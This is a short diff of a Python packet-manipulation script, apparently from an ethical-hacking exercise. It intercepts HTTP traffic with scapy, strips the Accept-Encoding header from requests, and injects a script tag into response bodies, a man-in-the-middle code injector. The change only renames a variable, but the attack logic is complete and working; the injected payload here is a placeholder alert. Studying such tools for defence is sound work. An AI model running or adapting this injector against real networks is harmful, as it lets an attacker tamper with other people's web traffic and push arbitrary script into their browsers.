@@ -20,17 +20,17 @@ def process_packet(packet):
         if scapy_packet[scapy.TCP].dport == 80:
             print("[+] Request")
 #regex to replace the first arg with a empty string
-            modified_load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
+            load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
 #set modified_load into the scapy_packet as new_packet
-            new_packet = set_load(scapy_packet, modified_load)
+            new_packet = set_load(scapy_packet, load)
             packet.set_payload(str(new_packet))
 #check packets source port for 80 (http) RESPONSES
         elif scapy_packet[scapy.TCP].sport == 80:
             print("[+] Response")
 #in the captured packet replace the body in the load field with a script
-            modified_load = load.replace("</body>", "<script>alert('test');</script></body>")
+            load = load.replace("</body>", "<script>alert('test');</script></body>")
 #create new packet by replacing captured scapy_packet with the new modified load
-            new_packet = set_load(scapy_packet, modified_load)
+            new_packet = set_load(scapy_packet, load)
             packet.set_payload(str(new_packet))
     packet.accept()
 
